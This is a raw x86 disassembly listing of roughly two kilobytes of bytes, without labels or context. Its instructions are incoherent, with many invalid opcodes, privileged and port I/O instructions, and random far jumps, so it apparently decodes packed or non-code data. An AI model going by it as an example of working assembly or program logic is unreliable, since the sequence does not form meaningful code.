  4168ef:	sbb    eax,0x5088740c
  4168f4:	mov    bl,0xb4
  4168f6:	nop
  4168f7:	vmwrite eax,DWORD PTR [ebx+0x183ba0f8]
  4168fe:	mov    BYTE PTR [eax-0x46fdc015],ah
  416904:	pop    ecx
  416905:	or     BYTE PTR [edi+esi*1+0x61],al
  416909:	xor    BYTE PTR ds:0xc938580c,0xdd
  416910:	push   edx
  416911:	push   esi
  416912:	ja     0x416933
  416914:	push   es
  416915:	and    esi,0xffffffe4
  416918:	cmp    BYTE PTR [eax],bl
  41691a:	xor    BYTE PTR [esi+eiz*4-0x66c1caf9],cl
  416921:	popa   
  416922:	push   0x7f
  416924:	mov    eax,0xde3bc2b6
  416929:	loope  0x416975
  41692b:	aas    
  41692c:	out    dx,eax
  41692d:	das    
  41692e:	sbb    eax,0x5b16df3f
  416933:	pop    ebp
  416934:	ins    BYTE PTR es:[edi],dx
  416935:	and    ecx,DWORD PTR [ebp-0x69]
  416938:	xlat   BYTE PTR ds:[ebx]
  416939:	iret   
  41693a:	(bad)  
  41693b:	pop    es
  41693c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41693d:	xor    dl,cl
  41693f:	fcomp  DWORD PTR [esi-0x80]
  416942:	jno    0x4169a5
  416944:	xlat   BYTE PTR ds:[ebx]
  416945:	and    dl,BYTE PTR [edx-0x6592cd49]
  41694b:	sub    cl,BYTE PTR [ecx+0x5cb85f97]
  416951:	cmc    
  416952:	xlat   BYTE PTR ds:[ebx]
  416953:	sub    eax,0x7d673ba8
  416958:	mov    al,0x4e
  41695a:	iret   
  41695b:	ins    DWORD PTR es:[edi],dx
  41695c:	mov    cl,0xd9
  41695e:	loop   0x41693e
  416960:	je     0x4169a1
  416962:	xchg   edx,eax
  416963:	stc    
  416964:	lods   al,BYTE PTR ds:[esi]
  416965:	rcl    BYTE PTR [edx+ebx*4+0x51f42a8],1
  41696c:	jb     0x416938
  41696e:	jmp    0xada7d9a
  416973:	(bad)  
  416974:	leave  
  416975:	fisubr DWORD PTR [eax+0x1a]
  416978:	xor    eax,0x5d433eff
  41697d:	jmp    0x139e:0x8858871b
  416984:	fs test eax,0xe62c4e41
  41698a:	jmp    0xcdf2d712
  41698f:	mov    al,0x30
  416991:	dec    ebp
  416992:	jmp    0x2a5f:0x424962f
  416999:	mul    cl
  41699b:	cmp    esi,DWORD PTR [ebx-0x62]
  41699e:	xor    DWORD PTR [eax+0x1c],ebp
  4169a1:	sub    BYTE PTR [esi+0xd],dh
  4169a4:	js     0x41692b
  4169a6:	stc    
  4169a7:	out    0x7a,al
  4169a9:	mov    dh,0x29
  4169ab:	dec    edx
  4169ac:	pop    edx
  4169ad:	sar    DWORD PTR [eax+0x70c3ff33],cl
  4169b3:	xchg   esi,eax
  4169b4:	push   ss
  4169b5:	push   ebx
  4169b6:	mov    ds:0xb7eacee6,eax
  4169bb:	and    al,0x2d
  4169bd:	out    0xe2,eax
  4169bf:	fld    TBYTE PTR [edx]
  4169c1:	lods   eax,DWORD PTR ds:[esi]
  4169c2:	arpl   di,bx
  4169c4:	dec    ecx
  4169c5:	xchg   edx,eax
  4169c6:	xor    ebp,DWORD PTR [ebx+0x53]
  4169c9:	lock in al,0x4f
  4169cc:	(bad)  [eax-0x21]
  4169cf:	xor    dh,bh
  4169d1:	jb     0x416a0b
  4169d3:	jbe    0x416a1f
  4169d5:	inc    esi
  4169d6:	div    DWORD PTR [ebx+0x6e]
  4169d9:	or     esp,ebp
  4169db:	pop    edi
  4169dc:	or     al,0x47
  4169de:	repz (bad) 
  4169e0:	dec    ecx
  4169e1:	push   eax
  4169e2:	in     al,0x4
  4169e4:	xor    BYTE PTR [ebp-0x72],bh
  4169e7:	push   eax
  4169e8:	jne    0x416a52
  4169ea:	mov    BYTE PTR [eax+0x76fd8d7a],al
  4169f0:	addr16 mov dh,0x19
  4169f3:	sbb    ecx,DWORD PTR [edx-0x644ae737]
  4169f9:	adc    al,0xad
  4169fb:	mov    ecx,0xf0b3282e
  416a00:	jne    0x41698a
  416a02:	int    0x44
  416a04:	xchg   BYTE PTR ds:0x87443229,bl
  416a0a:	mov    WORD PTR [edi+0x59037d9e],?
  416a10:	les    esp,FWORD PTR [ebp+0x12]
  416a13:	lods   eax,DWORD PTR ds:[esi]
  416a14:	rcr    DWORD PTR [ecx+ecx*8+0x7],0x9f
  416a19:	hlt    
  416a1a:	xor    DWORD PTR [esp+edi*8-0x25dce5c4],ecx
  416a21:	sar    DWORD PTR [edi-0x37],cl
  416a24:	cli    
  416a25:	jo     0x416a8a
  416a27:	xchg   BYTE PTR [eax-0xe],cl
  416a2a:	inc    edi
  416a2b:	dec    eax
  416a2c:	inc    edi
  416a2d:	(bad)
  416a31:	js     0x416a8b
  416a33:	out    dx,al
  416a34:	std    
  416a35:	mov    edi,0xac2be0f4
  416a3a:	mov    eax,0xf2f5cff8
  416a3f:	dec    ebx
  416a40:	mov    eax,DWORD PTR [eax+0x37]
  416a43:	icebp  
  416a44:	pop    ebp
  416a45:	arpl   WORD PTR [esi-0x7e],di
  416a48:	add    DWORD PTR [ebx+ecx*2],edx
  416a4b:	stc    
  416a4c:	loopne 0x416a87
  416a4e:	mov    bl,0x93
  416a50:	or     DWORD PTR [esi-0x1ab2bc68],0xc52bc0a0
  416a5a:	fwait
  416a5b:	pop    es
  416a5c:	jecxz  0x416aa3
  416a5e:	mov    al,ds:0x72c8962
  416a63:	les    ecx,FWORD PTR [edx-0x44]
  416a66:	aas    
  416a67:	inc    ebx
  416a68:	jns    0x416ae3
  416a6a:	mov    edx,cs
  416a6c:	jle    0x416a6e
  416a6e:	add    BYTE PTR [eax],al
  416a70:	add    BYTE PTR [eax],al
  416a72:	call   0xfb7c3508
  416a77:	jnp    0x416a71
  416a79:	sar    DWORD PTR [edx+0x44f3b875],cl
  416a7f:	retf   
  416a80:	jno    0x416a6b
  416a82:	inc    ebp
  416a83:	call   0x5346a88
  416a88:	add    BYTE PTR [eax],al
  416a8a:	add    DWORD PTR [esi],ecx
  416a8c:	sub    al,0x55
  416a8e:	jmp    0x57cd:0xda7615fb
  416a95:	jns    0x416a29
  416a97:	jbe    0x416afa
  416a99:	ret    0x5200
  416a9c:	cmp    al,0x98
  416a9e:	pop    edi
  416a9f:	jbe    0x416a86
  416aa1:	cmp    esi,edi
  416aa3:	ret    0x4057
  416aa6:	add    DWORD PTR [ecx],edi
  416aa8:	mov    ds:0x736cef35,eax
  416aad:	les    eax,FWORD PTR [edi+0x1c196733]
  416ab3:	cmp    DWORD PTR [ebx],0x4a
  416ab6:	cmp    DWORD PTR [edx+0x3],esi
  416ab9:	or     DWORD PTR [ecx+0x7d],esi
  416abc:	retf   
  416abd:	sbb    dh,BYTE PTR [ebp-0x53]
  416ac0:	cmp    eax,DWORD PTR [esi+0x234ba513]
  416ac6:	imul   edx,eax,0x20
  416ac9:	outs   dx,BYTE PTR ds:[esi]
  416aca:	mov    WORD PTR [esp+esi*8-0x2],fs
  416ace:	aad    0xb5
  416ad0:	sub    esp,0x112c8ec4
  416ad6:	jge    0x416b30
  416ad8:	sub    eax,0x419cc336
  416add:	out    0x97,al
  416adf:	dec    esi
  416ae0:	cmp    eax,0x93f039b
  416ae5:	sub    ecx,DWORD PTR [edx+eax*1]
  416ae8:	repz push edx
  416aea:	ret    
  416aeb:	sub    DWORD PTR [ecx],esi
  416aed:	push   ds
  416aee:	pop    eax
  416aef:	push   0xd1be74b
  416af4:	xchg   edi,eax
  416af5:	out    0x3a,eax
  416af7:	(bad)  
  416af8:	mov    ebx,0xa770d8ce
  416afd:	stos   DWORD PTR es:[edi],eax
  416afe:	stc    
  416aff:	rol    dl,1
  416b01:	jno    0x416aaa
  416b03:	out    0x87,al
  416b05:	out    dx,al
  416b06:	push   edx
  416b07:	add    BYTE PTR [ebx-0x33],ah
  416b0a:	sti    
  416b0b:	sti    
  416b0c:	or     ah,BYTE PTR [eax-0x30dd8030]
  416b12:	pop    edi
  416b13:	fwait
  416b14:	add    eax,0x8b9a79b3
  416b19:	fidiv  DWORD PTR [edx+ecx*2-0x9c28749]
  416b20:	pop    eax
  416b21:	adc    DWORD PTR [eax+0x373aa8c9],0xffffffcb
  416b28:	stos   DWORD PTR es:[edi],eax
  416b29:	ins    BYTE PTR es:[edi],dx
  416b2a:	in     al,0x3f
  416b2c:	test   cl,cl
  416b2e:	ss lahf 
  416b30:	sbb    esi,DWORD PTR [eax-0x47]
  416b33:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  416b35:	scas   al,BYTE PTR es:[edi]
  416b36:	sub    esi,ebp
  416b38:	mov    ah,0xf0
  416b3a:	mov    dh,bh
  416b3c:	mov    eax,ds:0xd393d6ed
  416b41:	mov    BYTE PTR [edi],cl
  416b43:	call   0xf367:0x80cb0bed
  416b4a:	jmp    0xe19e:0xc99aec2d
  416b51:	push   edx
  416b52:	imul   edi,DWORD PTR [edx-0x5c],0x53
  416b56:	out    dx,eax
  416b57:	xor    eax,0x62f3f232
  416b5c:	pop    ebp
  416b5d:	es dec esp
  416b5f:	inc    esp
  416b60:	ret    
  416b61:	mov    esp,0xbbce802c
  416b66:	sbb    ecx,esp
  416b68:	ret    0x10fa
  416b6b:	fmul   DWORD PTR [ebx+0x71f416b7]
  416b71:	rcr    dl,cl
  416b73:	ja     0x416b87
  416b75:	or     eax,0x566ba9b4
  416b7a:	pop    ebp
  416b7b:	enter  0xf9af,0xc1
  416b7f:	test   DWORD PTR [edi],0x67d5a7ad
  416b85:	inc    eax
  416b86:	inc    esi
  416b87:	cs iret 
  416b89:	push   ss
  416b8a:	shl    BYTE PTR [edx+0x2d0f0c4c],1
  416b90:	pop    es
  416b91:	push   ebp
  416b92:	stos   BYTE PTR es:[edi],al
  416b93:	retf   0x83f2
  416b96:	scas   eax,DWORD PTR es:[edi]
  416b97:	fsubp  st(0),st
  416b99:	and    al,0xbf
  416b9b:	xor    eax,DWORD PTR [edi]
  416b9d:	ins    BYTE PTR es:[edi],dx
  416b9e:	jbe    0x416b73
  416ba0:	das    
  416ba1:	dec    ebx
  416ba2:	daa    
  416ba3:	mov    ecx,0x848bc9be
  416ba8:	dec    edx
  416ba9:	fnstenv [edi]
  416bab:	mov    ebx,0x34f2d72c
  416bb0:	push   ds
  416bb1:	mov    cl,0x7c
  416bb3:	das    
  416bb4:	je     0x416b75
  416bb6:	or     BYTE PTR [edi-0x66],ch
  416bb9:	(bad)  
  416bbb:	shl    DWORD PTR [eax-0x6],cl
  416bbe:	addr16 pop es
  416bc0:	repz inc esi
  416bc2:	data16 mov ds,WORD PTR [edx]
  416bc5:	jb     0x416c0f
  416bc7:	popa   
  416bc8:	or     eax,0x7570aaf2
  416bcd:	pop    ecx
  416bce:	jb     0x416bf1
  416bd0:	fsub   DWORD PTR [ebp+0x1152c8fe]
  416bd6:	jns    0x416be8
  416bd8:	inc    edi
  416bd9:	xor    ebp,DWORD PTR [edi+0x3]
  416bdc:	sub    esi,DWORD PTR [esi]
  416bde:	loope  0x416c40
  416be0:	repz xor DWORD PTR [eax],esi
  416be3:	pop    edi
  416be4:	rcl    BYTE PTR [edi+0x49bc60c7],cl
  416bea:	xchg   ecx,eax
  416beb:	lahf   
  416bec:	aaa    
  416bed:	(bad)  
  416bee:	jne    0x416c57
  416bf0:	cli    
  416bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bf2:	rcr    DWORD PTR [esi],cl
  416bf4:	mov    DWORD PTR [ebx-0x53],esp
  416bf7:	(bad)  
  416bf8:	aas    
  416bf9:	cmp    al,0x5c
  416bfb:	xchg   BYTE PTR [ebx],al
  416bfd:	sub    eax,0xc59d0453
  416c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c03:	mov    bh,0xc9
  416c05:	test   al,0x21
  416c07:	mov    fs,WORD PTR [edx+0xb2dee31]
  416c0d:	mov    al,ds:0x8808f60c
  416c12:	pop    ebx
  416c13:	call   0x142feb81
  416c18:	pop    ebx
  416c19:	call   0xa7a5:0xe5bbc945
  416c20:	loop   0x416c4f
  416c22:	je     0x416bd1
  416c24:	int    0x1d
  416c26:	pop    ebx
  416c27:	ins    BYTE PTR es:[edi],dx
  416c28:	or     ah,BYTE PTR [edx+0x6bb239ce]
  416c2e:	mov    al,ds:0x2299a142
  416c33:	imul   edx,DWORD PTR [eax-0x34],0x3d
  416c37:	sub    ebx,DWORD PTR [ecx+eiz*1-0x64]
  416c3b:	dec    ecx
  416c3c:	mov    ds:0xacd4f19e,al
  416c41:	daa    
  416c42:	mov    WORD PTR [esi],gs
  416c44:	add    ebx,esi
  416c46:	dec    ebp
  416c47:	mov    ch,0xa8
  416c49:	mov    ds:0xa6d5f709,eax
  416c4e:	dec    ebx
  416c4f:	mov    dh,0xeb
  416c51:	popf   
  416c52:	mov    ds:0x875e2f0d,eax
  416c57:	(bad)  
  416c59:	idiv   BYTE PTR [eax+0x77df70ce]
  416c5f:	push   edx
  416c60:	or     BYTE PTR [esi],dl
  416c62:	into   
  416c63:	and    DWORD PTR [ebx-0x2],ebp
  416c66:	adc    edi,DWORD PTR [edi]
  416c68:	xchg   ecx,eax
  416c69:	lods   eax,DWORD PTR ds:[esi]
  416c6a:	mov    bl,0x55
  416c6c:	xor    al,0x74
  416c6e:	aam    0x30
  416c70:	shr    DWORD PTR [ebx],0x4d
  416c73:	cmp    al,0x19
  416c75:	lock pop esi
  416c77:	mul    BYTE PTR [edi+0x58]
  416c7a:	add    al,0xaf
  416c7c:	push   ss
  416c7d:	cld    
  416c7e:	push   DWORD PTR [edx-0x11b04109]
  416c84:	rol    BYTE PTR cs:[eax+0x5c],0x1e
  416c89:	mov    WORD PTR [esi],fs
  416c8b:	sbb    edx,DWORD PTR [eax-0x7e]
  416c8e:	retf   
  416c8f:	mov    ecx,0x1cee310b
  416c94:	push   ds
  416c95:	inc    edi
  416c96:	sbb    al,0x58
  416c98:	mul    DWORD PTR [ecx+0x53f717b5]
  416c9e:	sub    eax,0xfc9ff329
  416ca3:	lock sbb al,0xeb
  416ca6:	sbb    eax,0xb9433a11
  416cab:	idiv   BYTE PTR [ebp+0x58]
  416cae:	cmp    DWORD PTR [edx-0x35],0x776b3de3
  416cb5:	push   eax
  416cb6:	test   eax,0x64098d00
  416cbb:	jne    0x416cf4
  416cbd:	(bad)  [ebx]
  416cbf:	cmp    ax,0x9405
  416cc3:	stc    
  416cc4:	cs gs xchg edx,eax
  416cc7:	adc    al,0x68
  416cc9:	xchg   ebp,eax
  416cca:	aas    
  416ccb:	lds    edx,FWORD PTR [ebp+0x5e]
  416cce:	nop
  416ccf:	jne    0x416cd0
  416cd1:	sti    
  416cd2:	jl     0x416cb0
  416cd4:	mov    ecx,0x8cba989a
  416cd9:	inc    ebx
  416cda:	or     ecx,ebp
  416cdc:	mov    edx,0x642cabc5
  416ce1:	or     eax,0xb53bcf84
  416ce6:	inc    esp
  416ce7:	jno    0x416cf8
  416ce9:	sbb    eax,ebx
  416ceb:	push   0xfffffffd
  416ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cee:	xchg   ecx,eax
  416cef:	dec    ecx
  416cf0:	rol    DWORD PTR [ecx+0x3baa72bc],cl
  416cf6:	outs   dx,BYTE PTR ds:[esi]
  416cf7:	xchg   ebx,eax
  416cf8:	pop    es
  416cf9:	dec    edi
  416cfa:	stos   BYTE PTR es:[edi],al
  416cfb:	test   BYTE PTR [ebp+0x671ad9ad],ch
  416d01:	in     eax,dx
  416d02:	(bad)  
  416d03:	in     al,dx
  416d04:	jo     0x416d7b
  416d06:	pop    ecx
  416d07:	mov    ebp,0x6931c67
  416d0c:	popa   
  416d0d:	cmc    
  416d0e:	dec    ecx
  416d0f:	mov    cl,0x2c
  416d11:	mov    ch,0x2c
  416d13:	ret    
  416d14:	(bad)  
  416d15:	pop    edx
  416d16:	dec    esp
  416d17:	hlt    
  416d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d19:	int3   
  416d1a:	jno    0x416d41
  416d1c:	loope  0x416d97
  416d1e:	nop
  416d1f:	xchg   esp,eax
  416d20:	rcr    bl,0x50
  416d23:	xchg   DWORD PTR [eax],edi
  416d25:	(bad)  
  416d26:	xchg   ebx,eax
  416d27:	ds stos BYTE PTR es:[edi],al
  416d29:	xchg   DWORD PTR [ecx-0x4d],esi
  416d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d2d:	add    al,0xe3
  416d2f:	jmp    0x1d3ced62
  416d34:	je     0x416dab
  416d36:	dec    edx
  416d37:	test   eax,0xcc7cbf51
  416d3c:	dec    ebp
  416d3d:	xlat   BYTE PTR ds:[ebx]
  416d3e:	fwait
  416d3f:	mov    eax,0x319cac08
  416d44:	mov    ebx,0x7990903e
  416d49:	sub    al,0x27
  416d4b:	pop    ecx
  416d4c:	xchg   ebx,eax
  416d4d:	dec    edi
  416d4e:	lds    eax,FWORD PTR [ebx+0x41]
  416d51:	add    BYTE PTR [edi],0x9
  416d54:	jbe    0x416d13
  416d56:	bound  esp,QWORD PTR ds:0xa0b353d4
  416d5c:	add    DWORD PTR [ecx],edx
  416d5e:	fmul   st,st(7)
  416d60:	cdq    
  416d61:	fs dec edx
  416d63:	ja     0x416cea
  416d65:	xchg   esp,eax
  416d66:	pop    eax
  416d67:	jbe    0x416de8
  416d69:	int3   
  416d6a:	test   al,0xe9
  416d6c:	adc    ch,dh
  416d6e:	inc    ebx
  416d6f:	jbe    0x416dd9
  416d71:	or     al,0xe4
  416d73:	out    0xdb,al
  416d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d76:	mov    ecx,0x1d517b59
  416d7b:	sbb    ebx,DWORD PTR [ecx+ecx*8]
  416d7e:	dec    ebp
  416d7f:	xchg   ebp,eax
  416d80:	xchg   esp,eax
  416d81:	fstp   TBYTE PTR [esi-0x1b]
  416d84:	add    eax,0x565108f6
  416d89:	mov    ds:0x5793cd79,al
  416d8e:	xchg   esi,eax
  416d8f:	jge    0x416d8f
  416d91:	pop    edx
  416d92:	inc    edx
  416d93:	add    DWORD PTR [ecx-0x40],eax
  416d96:	pop    ebp
  416d97:	jne    0x416d94
  416d99:	xchg   ebx,eax
  416d9a:	out    dx,al
  416d9b:	aam    0x2d
  416d9d:	sbb    cl,BYTE PTR [edi+eiz*1]
  416da0:	sbb    DWORD PTR [ebx],esp
  416da2:	adc    eax,DWORD PTR [edx-0x10]
  416da5:	add    esi,ebp
  416da7:	fdivr  QWORD PTR [edx+eax*2+0xaf0ab6d]
  416dae:	ins    BYTE PTR es:[edi],dx
  416daf:	outs   dx,BYTE PTR ds:[esi]
  416db0:	sbb    al,ch
  416db2:	sbb    BYTE PTR [ebx],0x16
  416db5:	cmp    dh,bh
  416db7:	int3   
  416db8:	pusha  
  416db9:	(bad)  
  416dba:	pop    ebp
  416dbb:	call   0x387d:0x934fb6eb
  416dc2:	push   ebx
  416dc3:	ds in  eax,0xa9
  416dc6:	cwde   
  416dc7:	push   cs
  416dc8:	aas    
  416dc9:	mov    edi,0x4581e997
  416dce:	in     eax,dx
  416dcf:	lock mov ch,0xae
  416dd2:	mov    dh,BYTE PTR [ebp-0x38e55333]
  416dd8:	sub    eax,0xaed17776
  416ddd:	mov    WORD PTR [ebx+0x26],cs
  416de0:	jno    0x416d85
  416de2:	aam    0x9e
  416de4:	pop    ecx
  416de5:	jge    0x416e09
  416de7:	leave  
  416de8:	mov    ebx,0x8c35dc55
  416ded:	adc    cl,dl
  416def:	jae    0x416e26
  416df1:	fadd   QWORD PTR [ecx]
  416df3:	jb     0x416dec
  416df5:	cmc    
  416df6:	push   esp
  416df7:	clc    
  416df8:	dec    edx
  416df9:	cmc    
  416dfa:	add    DWORD PTR [eax-0x2d],edx
  416dfd:	sub    ah,BYTE PTR ds:[ebp+0x4dade003]
  416e04:	jmp    DWORD PTR [esi+0x3ecd55e4]
  416e0a:	iret   
  416e0b:	mov    ebp,0x27ce8812
  416e10:	cdq    
  416e11:	retf   
  416e12:	out    0xf7,al
  416e14:	pop    es
  416e15:	ins    DWORD PTR es:[edi],dx
  416e16:	pop    esp
  416e17:	sti    
  416e18:	test   BYTE PTR [edx],bl
  416e1a:	aad    0x89
  416e1c:	inc    eax
  416e1d:	pop    ebp
  416e1e:	adc    ecx,ebx
  416e20:	xor    al,0xc4
  416e22:	cmc    
  416e23:	stos   DWORD PTR es:[edi],eax
  416e24:	or     DWORD PTR [eax+0x2a],edi
  416e27:	push   esi
  416e28:	stc    
  416e29:	jecxz  0x416e3f
  416e2b:	cli    
  416e2c:	mov    esp,0x637d71a2
  416e31:	inc    ebp
  416e32:	aaa    
  416e33:	inc    edi
  416e34:	xchg   BYTE PTR ds:[ecx-0x5a],ch
  416e38:	stc    
  416e39:	xor    DWORD PTR [esi+0x5df72e8c],esp
  416e3f:	push   ebx
  416e40:	sbb    eax,esi
  416e42:	iret   
  416e43:	mov    BYTE PTR [ebx+0x5b],0x5
  416e47:	test   BYTE PTR [eax+0x62],dh
  416e4a:	sub    eax,0xfa7e57e9
  416e4f:	mov    esi,0x5d4074c2
  416e54:	or     eax,0xc93eda58
  416e59:	lods   eax,DWORD PTR ds:[esi]
  416e5a:	or     cl,BYTE PTR [ebp+0x18]
  416e5d:	mov    dl,0xef
  416e5f:	loop   0x416e8a
  416e61:	fld    DWORD PTR [ecx+ebp*2]
  416e64:	jne    0x416e42
  416e66:	mov    bh,0xc7
  416e68:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e6a:	repz icebp 
  416e6c:	pop    ebp
  416e6d:	or     BYTE PTR [ebx],bl
  416e6f:	out    0x68,al
  416e71:	inc    ebp
  416e72:	adc    edx,0x5c
  416e75:	in     eax,0x14
  416e77:	aad    0x64
  416e79:	inc    edx
  416e7a:	adc    BYTE PTR [eax+ecx*2],0xa
  416e7e:	leave  
  416e7f:	call   0x3abc:0xf452a93
  416e86:	lds    ebx,FWORD PTR [edi]
  416e88:	stc    
  416e89:	in     eax,dx
  416e8a:	inc    edx
  416e8b:	out    dx,eax
  416e8c:	ror    DWORD PTR [ebp-0x66],cl
  416e8f:	ret    
  416e90:	in     al,0xb8
  416e92:	stc    
  416e93:	sub    DWORD PTR [esi+0x260a818d],0x1423290c
  416e9d:	jo     0x416e94
  416e9f:	pop    ecx
  416ea0:	pusha  
  416ea1:	mov    dl,0x5a
  416ea3:	pop    eax
  416ea4:	fcom   st(4)
  416ea6:	iret   
  416ea7:	xchg   ebx,eax
  416ea8:	(bad)  
  416ea9:	mov    ah,0xc2
  416eab:	cmc    
  416eac:	mov    bl,al
  416eae:	aas    
  416eaf:	icebp  
  416eb0:	test   DWORD PTR [eax-0x25d7abd4],esi
  416eb6:	jo     0x416f18
  416eb8:	aaa    
  416eb9:	rcl    BYTE PTR [ecx],1
  416ebb:	ret    0xedd1
  416ebe:	dec    esi
  416ebf:	xchg   esi,eax
  416ec0:	loope  0x416e6b
  416ec2:	inc    eax
  416ec3:	mov    ds:0x865692d4,al
  416ec8:	stc    
  416ec9:	nop
  416eca:	stos   DWORD PTR es:[edi],eax
  416ecb:	pusha  
  416ecc:	cs sub eax,0xfcde8cf0
  416ed2:	imul   edi,DWORD PTR [edi],0x9114c6be
  416ed8:	(bad)  
  416ed9:	jg     0x416f08
  416edb:	inc    edi
  416edc:	mov    ss,WORD PTR [eax]
  416ede:	inc    eax
  416edf:	call   0xb423:0x9dfea43a
  416ee6:	push   0x218ac393
  416eeb:	cmp    bx,cx
  416eee:	ins    BYTE PTR es:[edi],dx
  416eef:	mov    al,ds:0x6aebcb8e
  416ef4:	inc    esp
  416ef5:	push   ecx
  416ef6:	std    
  416ef7:	shr    BYTE PTR [esi-0x2e],1
  416efa:	push   esi
  416efb:	pop    eax
  416efc:	leave  
  416efd:	fmul   QWORD PTR [ebx-0x51]
  416f00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f01:	in     eax,dx
  416f02:	es mov edi,0x4d19d21c
  416f08:	xor    bh,bl
  416f0a:	cli    
  416f0b:	(bad)  
  416f0c:	xchg   ebp,eax
  416f0d:	outs   dx,DWORD PTR ds:[esi]
  416f0e:	xor    eax,0x62be2010
  416f13:	sbb    DWORD PTR ds:0xc25d2b4a,edx
  416f19:	and    esp,DWORD PTR ds:0xdb5be4e7
  416f1f:	or     DWORD PTR [edx],edi
  416f21:	hlt    
  416f22:	xor    eax,DWORD PTR [edi+0x1875ebd]
  416f28:	cdq    
  416f29:	lock cmp eax,0xf7fe2957
  416f2f:	out    dx,al
  416f30:	jo     0x416ed5
  416f32:	pop    esi
  416f33:	xchg   ebx,eax
  416f34:	jae    0x416f5c
  416f36:	dec    edi
  416f37:	inc    eax
  416f38:	in     al,0x9f
  416f3a:	xlat   BYTE PTR ds:[ebx]
  416f3b:	pop    ecx
  416f3c:	rcl    esi,0xc8
  416f3f:	in     eax,0x45
  416f41:	jmp    0x416ef7
  416f43:	in     ax,dx
  416f45:	sub    edi,eax
  416f47:	xchg   ecx,eax
  416f48:	icebp  
  416f49:	retf   0x2eae
  416f4c:	idiv   BYTE PTR [ecx]
  416f4e:	and    DWORD PTR [esi+0x1339e884],esp
  416f54:	and    DWORD PTR ds:0xaa4b2e2,edx
  416f5a:	clc    
  416f5b:	out    dx,al
  416f5c:	add    al,0x1b
  416f5e:	xor    bh,ah
  416f60:	pop    es
  416f61:	imul   ebp,DWORD PTR [edi-0x5],0x9ba6f514
  416f68:	not    BYTE PTR [esi]
  416f6a:	loope  0x416f63
  416f6c:	rcl    al,cl
  416f6e:	jle    0x416fb6
  416f70:	and    al,0xfb
  416f72:	inc    ebx
  416f73:	or     edx,DWORD PTR [ebp-0xf]
  416f76:	adc    BYTE PTR [esi-0x7a],ch
  416f79:	or     DWORD PTR [edi],ebp
  416f7b:	mov    BYTE PTR [eax+0x0],dh
  416f7e:	add    BYTE PTR [eax],al
  416f80:	add    BYTE PTR [eax],al
  416f82:	push   ebp
  416f83:	sub    al,0x5f
  416f85:	test   DWORD PTR [edi-0x9],edi
  416f88:	(bad)  
  416f8a:	adc    dh,BYTE PTR [ecx-0x256909da]
  416f90:	repnz repnz cmp ch,ch
  416f94:	add    BYTE PTR [eax],al
  416f96:	repz add al,0x0
  416f99:	add    BYTE PTR [edx],bl
  416f9b:	scas   eax,DWORD PTR es:[edi]
  416f9c:	inc    ebx
  416f9d:	ds hlt 
  416f9f:	popw   es
  416fa1:	shr    DWORD PTR [ebx],0xce
  416fa4:	add    ah,dl
  416fa6:	sbb    esi,DWORD PTR [ebx]
  416fa8:	in     al,0x5f
  416faa:	xchg   ecx,eax
  416fab:	mov    al,ds:0xe45dfb4
  416fb0:	mov    ch,0x40
  416fb2:	dec    ebx
  416fb3:	(bad)  
  416fb4:	into   
  416fb5:	add    BYTE PTR [eax],dh
  416fb7:	shl    BYTE PTR [esi-0x3f],1
  416fba:	int    0xa5
  416fbc:	mov    al,0xf2
  416fbe:	and    al,0xfc
  416fc0:	add    al,0xec
  416fc2:	mov    dh,0x7e
  416fc4:	cmp    BYTE PTR [ecx+0x15],dh
  416fc7:	push   ebp
  416fc8:	ror    DWORD PTR [esi+0x47],cl
  416fcb:	ja     0x416f76
  416fcd:	stos   BYTE PTR es:[edi],al
  416fce:	sub    edx,ebx
  416fd0:	push   cs
  416fd1:	dec    DWORD PTR [ebx]
  416fd3:	inc    esi
  416fd4:	dec    ebp
  416fd5:	jnp    0x416f5d
  416fd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fd8:	mov    dl,0xbc
  416fda:	mov    cl,0xe4
  416fdc:	mov    cl,0xb0
  416fde:	in     al,dx
  416fdf:	and    DWORD PTR [edx+eax*1-0xf26df50],ecx
  416fe6:	add    eax,0x9b102ff4
  416feb:	mov    al,ds:0xea3b7443
  416ff0:	push   0x48
  416ff2:	repz push ds
  416ff4:	sub    dl,BYTE PTR [esi+ebx*2]
  416ff7:	je     0x416ffd
  416ff9:	cmc    
  416ffa:	cmp    BYTE PTR [eax-0x63c4f9fa],cl
  417000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417001:	cmp    al,0xc1
  417003:	inc    edx
  417004:	jnp    0x416ff9
  417006:	mov    BYTE PTR ds:0x781e9a83,dh
  41700c:	test   ah,ah
  41700e:	and    DWORD PTR [ebx-0x3e730c80],0xf980657c
  417018:	jnp    0x417007
  41701a:	sahf   
  41701b:	mov    WORD PTR [ebx-0x698b138b],?
  417021:	cmp    eax,0x39d3002
  417026:	call   0x1dc898f9
  41702b:	add    al,0xdb
  41702d:	jmp    0x87ce:0xaa570f53
  417034:	and    al,0xa3
  417036:	data16 aam 0xa8
  417039:	cmc    
  41703a:	inc    edx
  41703b:	mov    esp,?
  41703d:	adc    ebx,DWORD PTR [edi+ebp*2-0x63]
  417041:	ret    
  417042:	xlat   BYTE PTR ds:[ebx]
  417043:	jno    0x4170b8
  417045:	sub    ebx,DWORD PTR [edi+0x2734c272]
  41704b:	dec    edi
  41704c:	dec    edx
  41704d:	fs mov edx,0x17d90e23
  417053:	call   0x2a5d:0x95424b38
  41705a:	ins    DWORD PTR es:[edi],dx
  41705b:	ret    
  41705c:	push   ebx
  41705d:	aaa    
  41705e:	sub    al,0x40
  417060:	pop    esp
  417061:	jp     0x417068
  417063:	push   ds
  417064:	sbb    dl,BYTE PTR [edi+eiz*1-0x4fcf76a0]
  41706b:	outs   dx,DWORD PTR ds:[esi]
  41706c:	lds    esi,FWORD PTR [ecx]
  41706e:	fadd   QWORD PTR [esi-0x5e]
  417071:	mov    esi,0x430ad7d9
  417076:	xor    al,0xa9
  417078:	sub    al,BYTE PTR [edx+0x5d0c377c]
